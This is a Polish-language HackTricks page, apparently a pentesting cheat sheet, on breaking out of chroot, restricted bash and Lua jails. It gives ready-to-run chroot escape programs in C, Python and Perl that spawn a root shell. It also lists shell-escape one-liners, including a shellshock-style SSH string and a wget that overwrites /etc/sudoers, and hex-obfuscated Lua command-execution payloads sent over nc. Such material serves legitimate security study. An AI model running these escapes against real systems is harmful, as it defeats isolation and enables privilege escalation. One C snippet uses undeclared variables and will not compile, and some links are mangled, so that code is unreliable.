# Ucieczka z więzień

{% hint style="success" %}
Ucz się i ćwicz Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Ucz się i ćwicz Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wsparcie dla HackTricks</summary>

* Sprawdź [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podziel się trikami hackingowymi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriów na githubie.

</details>
{% endhint %}

## **GTFOBins**

**Szukaj w** [**https://gtfobins.github.io/**](https://gtfobins.github.io) **czy możesz wykonać jakikolwiek binarny plik z właściwością "Shell"**

## Ucieczki Chroot

Z [wikipedia](https://en.wikipedia.org/wiki/Chroot#Limitations): Mechanizm chroot **nie jest przeznaczony do obrony** przed celowym manipulowaniem przez **uprzywilejowanych** (**root**) **użytkowników**. W większości systemów konteksty chroot nie są poprawnie stosowane, a programy chrooted **z wystarczającymi uprawnieniami mogą wykonać drugi chroot, aby się wydostać**.\
Zwykle oznacza to, że aby uciec, musisz być rootem wewnątrz chroot.

{% hint style="success" %}
**Narzędzie** [**chw00t**](https://github.com/earthquake/chw00t) zostało stworzone, aby wykorzystać następujące scenariusze i uciec z `chroot`.
{% endhint %}

### Root + CWD

{% hint style="warning" %}
Jeśli jesteś **rootem** wewnątrz chroot, **możesz uciec**, tworząc **kolejny chroot**. Dzieje się tak, ponieważ 2 chrooty nie mogą współistnieć (w Linuxie), więc jeśli stworzysz folder, a następnie **utworzysz nowy chroot** w tym nowym folderze będąc **na zewnątrz niego**, będziesz teraz **na zewnątrz nowego chroot** i dlatego będziesz w FS.

Dzieje się tak, ponieważ zwykle chroot NIE przenosi twojego katalogu roboczego do wskazanego, więc możesz stworzyć chroot, ale być na zewnątrz niego.
{% endhint %}

Zwykle nie znajdziesz binarnego pliku `chroot` wewnątrz więzienia chroot, ale **możesz skompilować, przesłać i wykonać** binarny plik:

<details>

<summary>C: break_chroot.c</summary>
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
mkdir("chroot-dir", 0755);
chroot("chroot-dir");
for(int i = 0; i < 1000; i++) {
chdir("..");
}
chroot(".");
system("/bin/bash");
}
```
</details>

<details>

<summary>Python</summary>
```python
#!/usr/bin/python
import os
os.mkdir("chroot-dir")
os.chroot("chroot-dir")
for i in range(1000):
os.chdir("..")
os.chroot(".")
os.system("/bin/bash")
```
</details>

<details>

<summary>Perl</summary>
```perl
#!/usr/bin/perl
mkdir "chroot-dir";
chroot "chroot-dir";
foreach my $i (0..1000) {
chdir ".."
}
chroot ".";
system("/bin/bash");
```
</details>

### Root + Saved fd

{% hint style="warning" %}
To jest podobne do poprzedniego przypadku, ale w tym przypadku **atakujący przechowuje deskryptor pliku do bieżącego katalogu** i następnie **tworzy chroot w nowym folderze**. Ostatecznie, ponieważ ma **dostęp** do tego **FD** **poza** chroot, uzyskuje do niego dostęp i **ucieka**.
{% endhint %}

<details>

<summary>C: break_chroot.c</summary>
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
mkdir("tmpdir", 0755);
dir_fd = open(".", O_RDONLY);
if(chroot("tmpdir")){
perror("chroot");
}
fchdir(dir_fd);
close(dir_fd);
for(x = 0; x < 1000; x++) chdir("..");
chroot(".");
}
```
</details>

### Root + Fork + UDS (Unix Domain Sockets)

{% hint style="warning" %}
FD może być przekazywane przez Unix Domain Sockets, więc:

* Utwórz proces potomny (fork)
* Utwórz UDS, aby rodzic i dziecko mogły się komunikować
* Uruchom chroot w procesie potomnym w innym folderze
* W procesie rodzica utwórz FD folderu, który znajduje się poza nowym chrootem procesu potomnego
* Przekaż temu procesowi potomnemu ten FD za pomocą UDS
* Proces potomny zmienia katalog na ten FD, a ponieważ jest on poza jego chrootem, ucieknie z więzienia
{% endhint %}

### Root + Mount

{% hint style="warning" %}
* Montowanie urządzenia root (/) w katalogu wewnątrz chroot
* Chrootowanie do tego katalogu

To jest możliwe w Linuksie
{% endhint %}

### Root + /proc

{% hint style="warning" %}
* Zamontuj procfs w katalogu wewnątrz chroot (jeśli jeszcze nie jest)
* Szukaj pid, który ma inną wpis root/cwd, na przykład: /proc/1/root
* Chrootuj do tego wpisu
{% endhint %}

### Root(?) + Fork

{% hint style="warning" %}
* Utwórz Fork (proces potomny) i chrootuj do innego folderu głębiej w FS i CD na nim
* Z procesu rodzica przenieś folder, w którym znajduje się proces potomny, do folderu poprzedzającego chroot dzieci
* Ten proces dziecięcy znajdzie się poza chrootem
{% endhint %}

### ptrace

{% hint style="warning" %}
* Dawno temu użytkownicy mogli debugować swoje własne procesy z procesu samego siebie... ale to nie jest już możliwe domyślnie
* Tak czy inaczej, jeśli to możliwe, możesz ptrace do procesu i wykonać shellcode wewnątrz niego ([zobacz ten przykład](linux-capabilities.md#cap\_sys\_ptrace)).
{% endhint %}

## Bash Jails

### Enumeration

Uzyskaj informacje o więzieniu:
```bash
echo $SHELL
echo $PATH
env
export
pwd
```
### Modify PATH

Sprawdź, czy możesz zmodyfikować zmienną środowiskową PATH
```bash
echo $PATH #See the path of the executables that you can use
PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin #Try to change the path
echo /home/* #List directory
```
### Używanie vim
```bash
:set shell=/bin/sh
:shell
```
### Utwórz skrypt

Sprawdź, czy możesz utworzyć plik wykonywalny z _/bin/bash_ jako zawartość
```bash
red /bin/bash
> w wx/path #Write /bin/bash in a writable and executable path
```
### Uzyskaj bash z SSH

Jeśli uzyskujesz dostęp przez ssh, możesz użyć tego triku, aby wykonać powłokę bash:
```bash
ssh -t user@<IP> bash # Get directly an interactive shell
ssh user@<IP> -t "bash --noprofile -i"
ssh user@<IP> -t "() { :; }; sh -i "
```
### Deklaracja
```bash
declare -n PATH; export PATH=/bin;bash -i

BASH_CMDS[shell]=/bin/bash;shell -i
```
### Wget

Możesz nadpisać na przykład plik sudoers
```bash
wget http://127.0.0.1:8080/sudoers -O /etc/sudoers
```
### Inne sztuczki

[**https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/**](https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/)\
[https://pen-testing.sans.org/blog/2012/0**b**6/06/escaping-restricted-linux-shells](https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells\*\*]\(https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells)\
[https://gtfobins.github.io](https://gtfobins.github.io/\*\*]\(https/gtfobins.github.io)\
**Może być również interesująca strona:**

{% content-ref url="../bypass-bash-restrictions/" %}
[bypass-bash-restrictions](../bypass-bash-restrictions/)
{% endcontent-ref %}

## Python Jails

Sztuczki dotyczące ucieczki z python jails na następującej stronie:

{% content-ref url="../../generic-methodologies-and-resources/python/bypass-python-sandboxes/" %}
[bypass-python-sandboxes](../../generic-methodologies-and-resources/python/bypass-python-sandboxes/)
{% endcontent-ref %}

## Lua Jails

Na tej stronie możesz znaleźć globalne funkcje, do których masz dostęp w lua: [https://www.gammon.com.au/scripts/doc.php?general=lua\_base](https://www.gammon.com.au/scripts/doc.php?general=lua\_base)

**Eval z wykonaniem polecenia:**
```bash
load(string.char(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))()
```
Niektóre sztuczki, aby **wywołać funkcje biblioteki bez użycia kropek**:
```bash
print(string.char(0x41, 0x42))
print(rawget(string, "char")(0x41, 0x42))
```
Wymień funkcje biblioteki:
```bash
for k,v in pairs(string) do print(k,v) end
```
Zauważ, że za każdym razem, gdy wykonujesz poprzednią jedną linię w **innym środowisku lua, kolejność funkcji się zmienia**. Dlatego, jeśli musisz wykonać jedną konkretną funkcję, możesz przeprowadzić atak brute force, ładując różne środowiska lua i wywołując pierwszą funkcję biblioteki le:
```bash
#In this scenario you could BF the victim that is generating a new lua environment
#for every interaction with the following line and when you are lucky
#the char function is going to be executed
for k,chr in pairs(string) do print(chr(0x6f,0x73,0x2e,0x65,0x78)) end

#This attack from a CTF can be used to try to chain the function execute from "os" library
#and "char" from string library, and the use both to execute a command
for i in seq 1000; do echo "for k1,chr in pairs(string) do for k2,exec in pairs(os) do print(k1,k2) print(exec(chr(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))) break end break end" | nc 10.10.10.10 10006 | grep -A5 "Code: char"; done
```
**Uzyskaj interaktywną powłokę lua**: Jeśli jesteś w ograniczonej powłoce lua, możesz uzyskać nową powłokę lua (i miejmy nadzieję, że nieograniczoną) wywołując:
```bash
debug.debug()
```
## Odniesienia

* [https://www.youtube.com/watch?v=UO618TeyCWo](https://www.youtube.com/watch?v=UO618TeyCWo) (Prezentacja: [https://deepsec.net/docs/Slides/2015/Chw00t\_How\_To\_Break%20Out\_from\_Various\_Chroot\_Solutions\_-\_Bucsay\_Balazs.pdf](https://deepsec.net/docs/Slides/2015/Chw00t\_How\_To\_Break%20Out\_from\_Various\_Chroot\_Solutions\_-\_Bucsay\_Balazs.pdf))

{% hint style="success" %}
Ucz się i ćwicz Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Ucz się i ćwicz Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wsparcie dla HackTricks</summary>

* Sprawdź [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podziel się sztuczkami hackingowymi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriów github.

</details>
{% endhint %}
